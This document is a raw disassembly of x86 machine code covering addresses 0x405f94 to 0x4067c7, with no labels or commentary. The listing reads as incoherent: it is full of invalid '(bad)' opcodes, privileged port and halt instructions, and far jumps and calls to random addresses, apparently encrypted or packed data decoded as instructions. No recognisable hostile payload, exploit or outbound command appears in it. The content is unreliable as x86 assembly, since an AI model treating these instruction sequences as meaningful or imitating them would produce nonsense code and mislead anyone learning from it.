  405f94:	jmp    0x479290b5
  405f99:	xor    DWORD PTR [eax],esi
  405f9b:	mov    dl,0x1e
  405f9d:	mov    eax,ds:0x566e62ed
  405fa2:	fldenv [ebp+0x52]
  405fa5:	out    0xc2,al
  405fa7:	push   ecx
  405fa8:	mov    bl,0xea
  405faa:	test   eax,0xb3289d2c
  405faf:	mov    edx,0x5b6462d6
  405fb4:	inc    edi
  405fb5:	popf   
  405fb6:	and    bl,dh
  405fb8:	clc    
  405fb9:	and    BYTE PTR [ebx],dh
  405fbb:	and    DWORD PTR [ecx+esi*4],ecx
  405fbe:	push   ds
  405fbf:	loop   0x405f41
  405fc1:	dec    ebx
  405fc2:	sub    BYTE PTR [edi+0x51],ch
  405fc5:	add    bh,0x6e
  405fc8:	push   eax
  405fc9:	dec    esi
  405fca:	inc    esp
  405fcb:	mov    ch,0x48
  405fcd:	ret    
  405fce:	xchg   esp,eax
  405fcf:	push   0xb71f389c
  405fd4:	adc    BYTE PTR [edi-0x44eb6628],ah
  405fda:	(bad)  
  405fdb:	loopne 0x406016
  405fdd:	nop
  405fde:	mov    ecx,gs
  405fe0:	ret    0xe463
  405fe3:	or     DWORD PTR [esi+0x2635cc55],eax
  405fe9:	out    0x2d,al
  405feb:	mov    esi,0x82fdb205
  405ff0:	mov    ecx,0x7264fd50
  405ff5:	jmp    0x4062e5
  405ffa:	iret   
  405ffb:	rcl    ebx,cl
  405ffd:	retf   
  405ffe:	ror    ebx,cl
  406000:	xlat   BYTE PTR ds:[ebx]
  406001:	(bad)  [ecx]
  406003:	lods   eax,DWORD PTR ds:[esi]
  406004:	and    al,0xa9
  406006:	call   0x78c2:0x89ce0683
  40600d:	js     0x40605c
  40600f:	jle    0x406089
  406011:	js     0x40604e
  406013:	aaa    
  406014:	pop    ss
  406015:	mov    eax,0x9d86f1aa
  40601a:	sar    BYTE PTR [esi-0x33],0xf4
  40601e:	fisttp DWORD PTR [eax-0x279307e7]
  406024:	retf   
  406025:	(bad)  
  406026:	jmp    0x40603f
  406028:	cmp    al,0x2b
  40602a:	data16 jge 0x406096
  40602d:	bndstx [eax],bnd2
  406030:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406031:	pop    esi
  406032:	push   edi
  406033:	icebp  
  406034:	mov    bh,0x4d
  406036:	in     eax,dx
  406037:	not    BYTE PTR [edi+0x4e]
  40603a:	ins    DWORD PTR es:[edi],dx
  40603b:	aam    0x8d
  40603d:	mov    ds:0x456fb627,al
  406042:	inc    esp
  406043:	rol    edx,0x75
  406046:	jo     0x405ffe
  406048:	test   al,0x6d
  40604a:	ret    0xe97b
  40604d:	jo     0x40603c
  40604f:	(bad)  
  406050:	xor    eax,0xb808c7a9
  406055:	and    al,0xb3
  406057:	jo     0x40605b
  406059:	mov    DWORD PTR [ebp-0x2],esp
  40605c:	push   cs
  40605d:	aaa    
  40605e:	add    BYTE PTR [edx],cl
  406060:	stos   BYTE PTR es:[edi],al
  406061:	pop    ss
  406062:	and    DWORD PTR [esp+eax*1-0x746b10c2],edx
  406069:	or     esi,esi
  40606b:	push   0x738f1de1
  406070:	(bad)  
  406071:	outs   dx,BYTE PTR ds:[esi]
  406072:	sahf   
  406073:	xchg   ebp,eax
  406074:	jbe    0x406083
  406076:	jle    0x4060ae
  406078:	xor    eax,0xde41a819
  40607d:	or     BYTE PTR ds:0x7c47de5c,0x60
  406084:	das    
  406085:	inc    ebp
  406086:	sub    edx,eax
  406088:	mov    ?,WORD PTR [ebx]
  40608a:	mov    cl,0xed
  40608c:	mov    ds:0x3e6b9ead,eax
  406091:	jecxz  0x406081
  406093:	mov    BYTE PTR [ecx+0x7f],ch
  406096:	fsincos 
  406098:	lahf   
  406099:	push   ecx
  40609b:	call   0xe390:0x111f852b
  4060a2:	and    DWORD PTR [esi-0x2f],edx
  4060a5:	pop    eax
  4060a6:	xchg   esi,eax
  4060a7:	fs cmc 
  4060a9:	hlt    
  4060aa:	mov    BYTE PTR [ebp+esi*1+0x64],cl
  4060ae:	pop    si
  4060b0:	lds    esp,FWORD PTR [esi]
  4060b2:	loopne 0x406062
  4060b4:	jge    0x4060c9
  4060b6:	aaa    
  4060b7:	sbb    edx,DWORD PTR [edx+0x7e]
  4060ba:	imul   edx,DWORD PTR [edx-0x78],0x57382c2a
  4060c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060c2:	and    cl,BYTE PTR [edx-0x340e1886]
  4060c8:	push   eax
  4060c9:	ror    ah,1
  4060cb:	stc    
  4060cc:	les    ebp,FWORD PTR [ecx+0x67]
  4060cf:	pop    es
  4060d0:	mov    ah,0x92
  4060d2:	push   edi
  4060d3:	loopne 0x406072
  4060d5:	jb     0x406073
  4060d7:	push   ds
  4060d8:	sbb    al,0x4
  4060da:	call   0xfabb:0xb7c93fc1
  4060e1:	pop    ebp
  4060e2:	ja     0x4060fa
  4060e4:	enter  0x9b46,0x2a
  4060e8:	and    DWORD PTR [ecx+0x9],ecx
  4060eb:	jmp    0x9b5a:0x8dcb1736
  4060f2:	dec    ebp
  4060f3:	xchg   BYTE PTR [esp+edx*4],cl
  4060f6:	inc    edi
  4060f7:	(bad)  
  4060f8:	loop   0x4060ff
  4060fa:	adc    eax,0xe33150b4
  4060ff:	jecxz  0x406142
  406101:	leave  
  406102:	packssdw mm7,QWORD PTR [ecx+0x5a8b122c]
  406109:	pop    esp
  40610a:	jmp    0x727b:0x19ce59df
  406111:	loop   0x4060c5
  406113:	mov    al,0xe9
  406115:	(bad)  
  406116:	mov    al,0x4f
  406118:	pop    ecx
  406119:	loope  0x40614b
  40611b:	mov    eax,ds:0x6023d54a
  406120:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406121:	jo     0x406112
  406123:	jbe    0x40610b
  406125:	jecxz  0x40616e
  406127:	jb     0x4060c6
  406129:	daa    
  40612a:	hlt    
  40612b:	hlt    
  40612c:	sbb    esi,DWORD PTR [edx+ebp*4-0x63bd675]
  406133:	pop    edx
  406134:	inc    ecx
  406135:	adc    dl,BYTE PTR ds:0xc2bca761
  40613b:	jmp    0x40612c
  40613d:	jmp    0x510a:0xbecbcf2c
  406144:	push   0xffffffbd
  406146:	adc    ah,BYTE PTR [ecx-0x5c]
  406149:	cmp    dh,al
  40614b:	mov    ebp,0x304d9a59
  406150:	pushf  
  406151:	mov    ds:0xea4aac7c,eax
  406156:	pop    ss
  406157:	stos   DWORD PTR es:[edi],eax
  406158:	push   0x44
  40615a:	fwait
  40615b:	cmp    BYTE PTR [edi-0x10023d33],dh
  406161:	lahf   
  406162:	cmc    
  406163:	enter  0x69a3,0x67
  406167:	jle    0x406118
  406169:	pop    edi
  40616a:	pop    ebp
  40616b:	dec    ecx
  40616c:	retf   0xe0de
  40616f:	pop    ecx
  406170:	or     BYTE PTR [ebx-0x2cbdca17],bh
  406176:	xchg   edi,eax
  406177:	push   es
  406178:	mov    ebp,0x99371dea
  40617d:	sbb    al,0x99
  40617f:	out    dx,eax
  406180:	xor    BYTE PTR [edx+0x7510aa9a],0x94
  406187:	push   edx
  406188:	(bad)  
  406189:	div    bh
  40618b:	adc    DWORD PTR [ebx+ebp*4+0x74],ebx
  40618f:	dec    esp
  406190:	mov    ds:0xd848abe0,al
  406195:	cmp    ebx,esi
  406197:	sbb    edi,ebp
  406199:	mov    al,0xf
  40619b:	inc    ebp
  40619c:	add    DWORD PTR [edx-0x7b],ecx
  40619f:	sub    eax,ebx
  4061a1:	into   
  4061a2:	add    bh,BYTE PTR [ebx+0x2c544196]
  4061a8:	(bad)  
  4061a9:	stos   BYTE PTR es:[edi],al
  4061aa:	dec    edi
  4061ab:	xlat   BYTE PTR ds:[ebx]
  4061ac:	mov    bh,0x1e
  4061ae:	push   edx
  4061af:	test   BYTE PTR [eax],dh
  4061b1:	in     al,0x51
  4061b3:	mov    DWORD PTR [ecx],esp
  4061b5:	and    BYTE PTR [eax+0x52],ch
  4061b8:	retf   
  4061b9:	jnp    0x40615d
  4061bb:	fs xchg ebp,eax
  4061bd:	push   es
  4061be:	cmp    eax,0x356cce60
  4061c3:	lea    esp,[ebp+0x4f]
  4061c6:	nop
  4061c7:	mov    ds:0xa4fa2c25,eax
  4061cc:	imul   ecx,DWORD PTR [ecx],0xffffffe6
  4061cf:	call   0x37de522
  4061d4:	leave  
  4061d5:	or     eax,0x54a49003
  4061da:	(bad)
  4061dd:	add    eax,esp
  4061df:	inc    esp
  4061e0:	mov    eax,0x398d86f2
  4061e5:	push   edi
  4061e6:	mov    cl,BYTE PTR [ebp+0x9358da1]
  4061ec:	js     0x4061a4
  4061ee:	cli    
  4061ef:	imul   edx,DWORD PTR [edx],0xffffffb6
  4061f2:	sub    al,BYTE PTR [ebx]
  4061f4:	jp     0x40626d
  4061f6:	mov    ds:0x1dbf5411,eax
  4061fb:	mov    edi,0xd085a895
  406200:	fimul  WORD PTR [edx-0x4215035f]
  406206:	cmp    al,0xb2
  406208:	out    0xf0,eax
  40620a:	jmp    0xab73:0x460bdd34
  406211:	jbe    0x4061a8
  406213:	ins    BYTE PTR es:[edi],dx
  406214:	mov    cl,0x4f
  406216:	mov    dl,0x43
  406218:	pop    es
  406219:	gs push edx
  40621b:	push   0xffffffa7
  40621d:	pop    ebx
  40621e:	jnp    0x4061bd
  406220:	cmp    BYTE PTR [esi-0x37],bh
  406223:	aad    0x2f
  406225:	sub    DWORD PTR [ecx+0x57ca40be],edi
  40622b:	stos   DWORD PTR es:[edi],eax
  40622c:	pop    ecx
  40622d:	std    
  40622e:	pop    ds
  40622f:	int    0xf
  406231:	fsubrp st(4),st
  406233:	iret   
  406234:	inc    eax
  406235:	jns    0x4062b6
  406237:	clc    
  406238:	test   DWORD PTR ds:0x937ad05a,esi
  40623e:	mov    cl,0x46
  406240:	cmpxchg esi,edi
  406243:	inc    ebx
  406244:	rcr    BYTE PTR [bp+di+0x6b],cl
  406248:	mov    ch,0xbd
  40624a:	ret    0xab34
  40624d:	call   0xc9bc:0xd7e1bd5
  406254:	sub    DWORD PTR [edx+ebx*8-0x32457d6f],eax
  40625b:	aad    0xe
  40625d:	int    0xe6
  40625f:	fs aad 0xa6
  406262:	adc    BYTE PTR [edx+0x1e],dl
  406265:	xor    eax,0x91b2eb8e
  40626a:	cmp    BYTE PTR [eax+0x65],dl
  40626d:	mov    ecx,0x74d5bd6
  406272:	(bad)  
  406273:	bound  ebp,QWORD PTR [ecx]
  406275:	pop    ebp
  406276:	jae    0x406272
  406278:	jnp    0x4062a4
  40627a:	sub    bl,BYTE PTR es:[ebx]
  40627d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40627e:	pop    ebp
  40627f:	sbb    esp,esp
  406281:	out    0x39,al
  406283:	addr16 cwde 
  406285:	xchg   ebx,eax
  406286:	call   0x71ee:0x3cdbb50a
  40628d:	and    ah,BYTE PTR [edx-0x35]
  406290:	xor    al,0x9e
  406292:	lahf   
  406293:	pop    esp
  406294:	pop    ds
  406295:	or     al,0xcd
  406297:	dec    esi
  406298:	mov    dh,0x32
  40629a:	mov    cl,0x78
  40629c:	xchg   edi,eax
  40629d:	call   esp
  40629f:	mov    eax,ds:0xbe2f7045
  4062a4:	mov    al,ds:0x1f68abdd
  4062a9:	mov    ecx,0x15b3ba82
  4062ae:	pusha  
  4062af:	push   ebx
  4062b0:	cld    
  4062b1:	enter  0xace6,0xdb
  4062b5:	push   DWORD PTR [edx-0x80]
  4062b8:	call   0x70cd262e
  4062bd:	add    al,0x14
  4062bf:	cmp    edi,DWORD PTR [ebx+0x5c]
  4062c2:	rcl    BYTE PTR [ebp+0x35],cl
  4062c5:	pop    ecx
  4062c6:	pop    ecx
  4062c7:	adc    eax,0xdf7166c0
  4062cc:	xor    al,0x9d
  4062ce:	push   esi
  4062cf:	sub    edx,DWORD PTR gs:[edx]
  4062d2:	or     DWORD PTR [edx-0x5896c6ff],eax
  4062d8:	or     bl,BYTE PTR [ebx*1-0x7de6ca6]
  4062df:	popf   
  4062e0:	add    eax,0xf5209597
  4062e5:	div    ecx
  4062e7:	mov    ecx,DWORD PTR [ebp+0x10]
  4062ea:	jmp    0x4065da
  4062ef:	(bad)  
  4062f0:	aas    
  4062f1:	ret    0xc9c2
  4062f4:	rol    esi,0xcb
  4062f7:	sbb    DWORD PTR [ebp-0x64],0x1d8b865c
  4062fe:	mov    esp,0x7878c7de
  406303:	dec    ebp
  406304:	jle    0x40637e
  406306:	js     0x4062ff
  406308:	fs bnd jb 0x4062a5
  40630c:	and    ecx,DWORD PTR [edi-0x403e8a1a]
  406312:	jmp    0x391e7a1c
  406317:	jge    0x406373
  406319:	mov    esi,ecx
  40631b:	push   ds
  40631c:	dec    eax
  40631d:	and    esp,edx
  40631f:	ins    DWORD PTR es:[edi],dx
  406320:	push   ebp
  406321:	sub    ecx,ebx
  406323:	in     eax,dx
  406324:	dec    esp
  406325:	dec    eax
  406326:	out    0x32,al
  406328:	push   ebp
  406329:	or     dl,bl
  40632b:	pop    eax
  40632c:	scas   al,BYTE PTR es:[edi]
  40632d:	add    al,0xb2
  40632f:	push   ecx
  406330:	jge    0x406309
  406332:	xor    DWORD PTR [esi],ecx
  406334:	cmp    BYTE PTR [ebx+0x1d],dh
  406337:	cdq    
  406338:	into   
  406339:	xchg   ebp,eax
  40633a:	mov    es,WORD PTR [eax-0x1a]
  40633d:	pop    edx
  40633e:	ret    0xe208
  406341:	xchg   edx,eax
  406342:	sub    DWORD PTR es:[ebp-0x6f],edi
  406346:	mov    cl,0xee
  406348:	mov    bl,0x3a
  40634a:	sbb    ebx,DWORD PTR [edx-0x7a]
  40634d:	leave  
  40634e:	jne    0x40633f
  406350:	pushf  
  406351:	pop    edx
  406352:	adc    esp,DWORD PTR [ebx+0x26ec354a]
  406358:	jmp    0x164cd2d
  40635d:	and    BYTE PTR [ebx],bl
  40635f:	add    al,bl
  406361:	push   edi
  406362:	retf   
  406363:	ror    DWORD PTR [edi-0x41c97a49],1
  406369:	ss sbb eax,0x440ccd1a
  40636f:	add    dl,BYTE PTR [ecx]
  406371:	inc    ecx
  406372:	stos   DWORD PTR es:[edi],eax
  406373:	mov    ecx,0x48e5e5ae
  406378:	aad    0x24
  40637a:	jo     0x4063d6
  40637c:	lea    eax,[edi-0x660cba6a]
  406382:	scas   eax,DWORD PTR es:[edi]
  406383:	mov    ebp,0x92810027
  406388:	and    cl,BYTE PTR [eax+edx*4-0x7c]
  40638c:	mov    ?,esp
  40638e:	mov    ah,0x14
  406390:	cli    
  406391:	mov    bh,0x64
  406393:	sbb    eax,0x515d89fe
  406398:	xchg   esp,eax
  406399:	mov    ebx,0xf0adc45c
  40639e:	(bad)  
  40639f:	shl    BYTE PTR [edx+0x5aeddb54],cl
  4063a5:	cmp    DWORD PTR [ecx+0x5698d0f2],0x55
  4063ac:	mov    cl,bh
  4063ae:	cli    
  4063af:	bound  edi,QWORD PTR [ecx]
  4063b1:	adc    al,0x6c
  4063b3:	fist   DWORD PTR [ebp-0x1213ae26]
  4063b9:	(bad)  [edi+0x71]
  4063bc:	xchg   edi,eax
  4063bd:	dec    ebp
  4063be:	mov    DWORD PTR [ebx+0x2d29fa6e],edi
  4063c4:	mov    eax,ds:0x38155693
  4063c9:	push   esi
  4063ca:	inc    ecx
  4063cb:	jmp    0xb263:0xf127804a
  4063d2:	sub    DWORD PTR [esi],0xffffff86
  4063d5:	scas   eax,DWORD PTR es:[edi]
  4063d6:	aam    0x4f
  4063d8:	repnz scas eax,DWORD PTR es:[edi]
  4063da:	outs   dx,BYTE PTR ds:[esi]
  4063dc:	dec    edi
  4063dd:	cmp    ecx,DWORD PTR [ecx+0x426e1e12]
  4063e3:	pop    ds
  4063e4:	dec    ebp
  4063e5:	cmp    al,0x7d
  4063e7:	pop    es
  4063e8:	aaa    
  4063e9:	hlt    
  4063ea:	(bad)
  4063ed:	add    dh,BYTE PTR [esi]
  4063ef:	in     ax,dx
  4063f1:	call   0xf7930574
  4063f6:	sbb    al,0x39
  4063f8:	mov    ss,ebx
  4063fa:	adc    al,0x86
  4063fc:	jae    0x406427
  4063fe:	scas   al,BYTE PTR es:[edi]
  4063ff:	in     eax,0x9c
  406401:	xchg   ebp,eax
  406402:	fcmovnb st,st(5)
  406404:	hlt    
  406405:	call   0x2260:0x2d28a082
  40640c:	data16 jl 0x4063d4
  40640f:	jl     0x4063a0
  406411:	loop   0x4063da
  406413:	jge    0x406407
  406415:	mov    dl,0xf0
  406417:	jecxz  0x406409
  406419:	xor    dh,BYTE PTR [ebp+0x282960aa]
  40641f:	les    edi,FWORD PTR [bx+0x65]
  406423:	popf   
  406424:	inc    ebp
  406425:	inc    edx
  406426:	cmp    BYTE PTR [ecx-0x4b9602ac],bh
  40642c:	dec    edi
  40642d:	pop    ds
  40642e:	icebp  
  40642f:	jg     0x406485
  406431:	enter  0x99e1,0xc9
  406435:	adc    al,0x23
  406437:	push   esp
  406438:	push   ebx
  406439:	add    eax,edx
  40643b:	mov    al,0xb4
  40643d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40643e:	sbb    BYTE PTR [edi-0x5],al
  406441:	fld    TBYTE PTR [esi-0x33ca4376]
  406447:	mov    DWORD PTR [edi+0x32],esi
  40644a:	hlt    
  40644b:	mov    DWORD PTR [eax+0x13],edx
  40644e:	mov    ebx,0xc8310c9f
  406454:	test   bl,bh
  406456:	cld    
  406457:	fcmovb st,st(5)
  406459:	pop    es
  40645a:	xchg   DWORD PTR [ebx+ebx*8],edi
  40645d:	xchg   esi,eax
  40645e:	pop    ebx
  40645f:	in     al,0x2
  406461:	mov    ds:0x32b1451f,al
  406466:	cmp    edx,DWORD PTR [ecx-0x5e]
  406469:	repz out 0xd0,al
  40646c:	in     al,0xb
  40646e:	sahf   
  40646f:	xor    al,0xff
  406471:	jbe    0x40644c
  406473:	sub    edi,edx
  406475:	cmp    ch,BYTE PTR [eax]
  406477:	inc    ecx
  406478:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406479:	nop
  40647a:	add    al,0x91
  40647c:	fld    TBYTE PTR [edx-0x1d]
  40647f:	pop    esp
  406480:	push   0x412a2a97
  406485:	pop    edx
  406486:	inc    ebp
  406487:	sub    eax,0x6a7ea36b
  40648c:	xor    DWORD PTR [esi+0x25],esp
  40648f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406490:	jmp    0x406426
  406492:	seto   bl
  406495:	psubsb mm3,mm0
  406498:	mov    edi,0x4b91ef5a
  40649d:	test   BYTE PTR [esi+0x611d1581],al
  4064a3:	fidivr WORD PTR [edi]
  4064a5:	pop    ss
  4064a6:	xor    ch,BYTE PTR ds:0x9bdee3ad
  4064ac:	jo     0x406438
  4064ae:	mov    al,0xaf
  4064b0:	cmp    ebp,DWORD PTR [edx-0x17abada4]
  4064b6:	pop    eax
  4064b7:	pop    esp
  4064b8:	pop    edi
  4064b9:	jl     0x406506
  4064bb:	jg     0x4064b6
  4064bd:	ss loopne 0x406469
  4064c0:	adc    eax,0x8d6081d4
  4064c5:	and    eax,0x77c6063b
  4064ca:	or     DWORD PTR [esi],edi
  4064cc:	inc    BYTE PTR [ebp+esi*2+0x1b77003e]
  4064d3:	test   DWORD PTR [ebp+0x2],0x2ca28ebb
  4064da:	and    BYTE PTR ss:0x6b4be634,0xd6
  4064e2:	shl    ah,0x10
  4064e5:	and    BYTE PTR [esi+0x2c8c3fc0],cl
  4064eb:	fisubr WORD PTR gs:[esp+edi*1+0x4ccf5dac]
  4064f3:	ins    BYTE PTR es:[edi],dx
  4064f4:	arpl   WORD PTR [ebx],ax
  4064f6:	(bad)  [eax]
  4064f8:	xor    ah,BYTE PTR [edx-0x1f795ce]
  4064fe:	mov    esi,edx
  406500:	retf   
  406501:	jns    0x40648d
  406503:	cmp    eax,0x56e307ab
  406508:	popa   
  406509:	and    BYTE PTR ds:0x8cf4c09,0xa8
  406510:	add    dh,BYTE PTR [ecx+0x20]
  406513:	rcr    eax,1
  406515:	jb     0x4064d1
  406517:	fs push ds
  406519:	pop    ss
  40651a:	dec    edx
  40651b:	mov    esi,0x27f7ef40
  406520:	push   es
  406521:	fst    DWORD PTR [eax]
  406523:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406524:	mov    eax,ds:0xefc9e1b9
  406529:	xor    eax,0xb6c7505e
  40652e:	add    al,0xbd
  406530:	loop   0x406540
  406532:	pop    ss
  406533:	fist   DWORD PTR [edi]
  406535:	push   ecx
  406536:	add    ecx,DWORD PTR [ebp+edx*2-0x1d]
  40653a:	mov    al,ds:0x894fbbd
  40653f:	adc    dh,BYTE PTR [esp+eiz*8+0x9]
  406543:	out    dx,al
  406544:	sti    
  406545:	mov    edx,0x61512338
  40654a:	push   es
  40654b:	fcom   QWORD PTR [ebp+ecx*1-0x64b12ed8]
  406552:	inc    edx
  406553:	push   ss
  406554:	scas   al,BYTE PTR es:[edi]
  406555:	clc    
  406556:	jmp    FWORD PTR [esi+esi*4]
  406559:	push   edi
  40655a:	in     al,dx
  40655b:	ror    BYTE PTR [esi+ebx*4],0x82
  40655f:	div    dh
  406561:	not    dh
  406563:	out    0xd5,eax
  406565:	dec    ebp
  406566:	hlt    
  406567:	inc    BYTE PTR [ecx]
  406569:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40656a:	call   0xd095:0xc5bccdc6
  406571:	clc    
  406572:	xor    DWORD PTR [ebx-0xf4b1793],ecx
  406578:	pop    esi
  406579:	div    DWORD PTR ds:0x1b8c0067
  40657f:	dec    edi
  406580:	xor    bh,ch
  406582:	push   es
  406583:	cld    
  406584:	cdq    
  406585:	or     ebp,esp
  406587:	jmp    0x4065ca
  406589:	gs cmp ah,ch
  40658c:	adc    BYTE PTR [ecx-0x166ae44a],ah
  406592:	cmp    eax,DWORD PTR [edi-0x53434777]
  406598:	xor    al,0xc9
  40659a:	push   edi
  40659b:	cmp    edi,ebp
  40659d:	push   edx
  40659e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40659f:	adc    BYTE PTR [esi+0x17],dh
  4065a2:	sub    ch,bh
  4065a4:	pop    esi
  4065a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065a7:	xor    ah,BYTE PTR [edx+0x3a]
  4065aa:	inc    ebx
  4065ab:	adc    al,BYTE PTR [esi-0x7197554d]
  4065b1:	dec    edx
  4065b2:	fwait
  4065b3:	int3   
  4065b4:	inc    esp
  4065b5:	cld    
  4065b6:	fdiv   st(0),st
  4065b8:	mov    dh,0x2d
  4065ba:	pop    esp
  4065bb:	and    BYTE PTR [edx+0x51],dh
  4065be:	out    0x4b,eax
  4065c0:	js     0x406623
  4065c2:	imul   esi,DWORD PTR [ecx+0x3f23ffc4],0x21e63efa
  4065cc:	das    
  4065cd:	inc    esi
  4065ce:	and    eax,0x9c65a70d
  4065d3:	jmp    0x8fe01872
  4065d8:	popa   
  4065d9:	je     0x4065fe
  4065db:	enter  0xc981,0x8e
  4065df:	sbb    eax,0xc18b8116
  4065e4:	jmp    0x4068d4
  4065e9:	ds enter 0x3dcf,0xcd
  4065ee:	cmp    eax,0xabe7cfce
  4065f3:	mov    ch,cl
  4065f5:	pop    esi
  4065f6:	lods   eax,DWORD PTR ds:[esi]
  4065f7:	sbb    al,BYTE PTR [ebx]
  4065f9:	xor    eax,esp
  4065fb:	js     0x406675
  4065fd:	dec    ebp
  4065fe:	jle    0x406678
  406600:	js     0x4065c7
  406602:	mov    edi,DWORD PTR [ebx+ecx*8-0x4f]
  406606:	pop    esi
  406607:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406609:	ds cwde 
  40660b:	cmp    dh,dh
  40660d:	ss aas 
  40660f:	pop    ebx
  406610:	push   cs
  406611:	test   BYTE PTR [edx],al
  406613:	xchg   ebp,eax
  406614:	loope  0x406625
  406616:	addr16 sbb ch,0xa3
  40661a:	retf   
  40661b:	or     eax,0x86564fb1
  406620:	push   ds
  406621:	loopne 0x4065e7
  406623:	imul   BYTE PTR [edi+0x66]
  406626:	retf   
  406627:	repnz push eax
  406629:	loope  0x4066a7
  40662b:	ss ja  0x406679
  40662e:	hlt    
  40662f:	mov    ah,0x78
  406631:	sub    cl,ah
  406633:	rol    DWORD PTR [ebp-0x11c10153],1
  406639:	repz cwde 
  40663b:	and    DWORD PTR [edi+0x370eb805],ebx
  406641:	ficom  DWORD PTR [edi]
  406643:	adc    edx,DWORD PTR [edi+0x8]
  406646:	lea    eax,[edx+0x74]
  406649:	dec    eax
  40664a:	inc    ebp
  40664b:	lea    ebp,[ebp+0x6eefff5f]
  406651:	add    al,0x2b
  406653:	jno    0x4065d5
  406655:	ins    BYTE PTR es:[edi],dx
  406656:	or     esi,ebp
  406658:	or     ebx,ebx
  40665a:	in     al,dx
  40665b:	std    
  40665c:	sbb    ebx,ecx
  40665e:	in     eax,dx
  40665f:	js     0x406660
  406661:	jbe    0x4066df
  406663:	test   BYTE PTR [ecx],bh
  406665:	mov    WORD PTR [esi],ss
  406667:	jg     0x406687
  406669:	ds jns 0x40669b
  40666c:	dec    ebp
  40666d:	iret   
  40666e:	pop    es
  40666f:	cli    
  406670:	mov    cl,0x77
  406672:	rol    DWORD PTR [ebx+edi*2],0xf
  406676:	or     BYTE PTR [ebp+0x1f4f71ab],bl
  40667c:	cdq    
  40667d:	xor    cl,BYTE PTR [ebp-0x3cda79d9]
  406683:	xor    ebp,DWORD PTR [esi-0x3db51fd9]
  406689:	xchg   ebp,eax
  40668a:	or     DWORD PTR [ecx+edx*4+0x69],ebp
  40668e:	mov    ebx,0x83c56b48
  406693:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406694:	push   esp
  406695:	sub    BYTE PTR [ecx+eiz*8],ch
  406698:	addr16 xchg esi,eax
  40669a:	xchg   esp,eax
  40669b:	xchg   BYTE PTR [edi+0x778c7b8b],dl
  4066a1:	push   eax
  4066a2:	jne    0x4066ec
  4066a4:	sub    BYTE PTR [esi+ecx*2-0x2e37fd18],al
  4066ab:	mov    dh,BYTE PTR [ebp+0x26734eb6]
  4066b1:	call   0xecfe471d
  4066b6:	inc    esp
  4066b7:	pop    ds
  4066b8:	add    edi,DWORD PTR [ebx+0x41ad4781]
  4066be:	mov    al,0x98
  4066c0:	adc    BYTE PTR [esp+edx*4-0x3fb65d06],cl
  4066c7:	(bad)  
  4066c9:	(bad)  [esp+edx*1]
  4066cc:	dec    esi
  4066cd:	mov    ebp,0x7ba07dbe
  4066d2:	or     eax,0x250bb0c4
  4066d7:	lock lods al,BYTE PTR ds:[esi]
  4066d9:	in     eax,dx
  4066da:	stos   DWORD PTR es:[edi],eax
  4066db:	retf   0x8f86
  4066de:	fld    QWORD PTR [esp+eax*1-0x3]
  4066e2:	cs mov edi,0xf7db5aa
  4066e8:	mov    ds:0x231fa7e0,al
  4066ed:	retf   
  4066ee:	mov    bh,0x4e
  4066f0:	repnz cs dec esp
  4066f3:	mov    bh,0x12
  4066f5:	xchg   ecx,eax
  4066f6:	repz mov edx,0x837433bb
  4066fc:	cwde   
  4066fd:	repnz cs in eax,0xaf
  406701:	sbb    BYTE PTR [esp+ebx*8],ch
  406704:	sub    eax,0x2d997fc5
  406709:	shr    BYTE PTR [esp+ebx*4],1
  40670c:	dec    edi
  40670d:	dec    ebx
  40670e:	sub    bh,BYTE PTR [eax+eax*4-0x1b]
  406712:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406713:	popf   
  406714:	and    DWORD PTR [ecx],0x7
  406717:	add    al,0x68
  406719:	push   esi
  40671a:	and    eax,0xf1c2c3e3
  40671f:	or     ebp,ecx
  406721:	jo     0x4066c4
  406723:	and    eax,0x3835c013
  406728:	jmp    0xd070:0xba236e65
  40672f:	addr16 mov bl,0x75
  406732:	js     0x406763
  406734:	push   ebp
  406735:	ja     0x4066bd
  406737:	add    DWORD PTR [esi+0x7536b921],esp
  40673d:	sti    
  40673e:	inc    ecx
  40673f:	sbb    eax,0xf3cf9191
  406744:	sub    BYTE PTR [ebp-0x75f6a80a],ah
  40674a:	and    cl,ch
  40674c:	dec    ecx
  40674d:	mov    esi,0xd8fcb0ed
  406752:	sub    cl,dh
  406754:	sub    eax,0x1a
  406757:	test   eax,0xc703b215
  40675c:	mov    esi,0x96ad2bdb
  406761:	mov    ds:0xf24f1027,eax
  406766:	or     dh,BYTE PTR [ecx+0x2b5e3da2]
  40676c:	push   eax
  40676d:	call   0x16372b60
  406772:	mov    al,ds:0x59d5c98a
  406777:	mov    esi,0x3a1d3c78
  40677c:	xor    esi,DWORD PTR [eax+0x6b]
  40677f:	mov    bl,0xa2
  406781:	inc    ebp
  406782:	fnsave [ebp+eax*8+0x2]
  406786:	(bad)  
  406787:	loope  0x4067e1
  406789:	retf   
  40678a:	adc    dl,dl
  40678c:	fwait
  40678d:	or     BYTE PTR [ebp+0x7b4c05d1],al
  406793:	xor    dl,BYTE PTR [eax]
  406795:	icebp  
  406796:	aas    
  406797:	rcr    BYTE PTR [ecx+0x25],1
  40679a:	and    al,0x7f
  40679c:	imul   esi,DWORD PTR [ecx-0x46],0x5088103d
  4067a3:	sub    ebx,esp
  4067a5:	ror    BYTE PTR [ebp-0x57],cl
  4067a8:	sar    DWORD PTR [esi+0x1],1
  4067ab:	repz mov bl,0xea
  4067ae:	cmp    al,0xb4
  4067b0:	push   edx
  4067b1:	xor    bh,BYTE PTR [eax+0x20]
  4067b4:	push   ds
  4067b5:	sub    DWORD PTR [ebp+0x7cd48e0a],ebp
  4067bb:	or     eax,0x8d793687
  4067c0:	pop    es
  4067c1:	inc    ebx
  4067c2:	or     al,0x3c
  4067c4:	xchg   ecx,eax
  4067c5:	push   esp
  4067c6:	lahf   
  4067c7:	jb     0x40676c
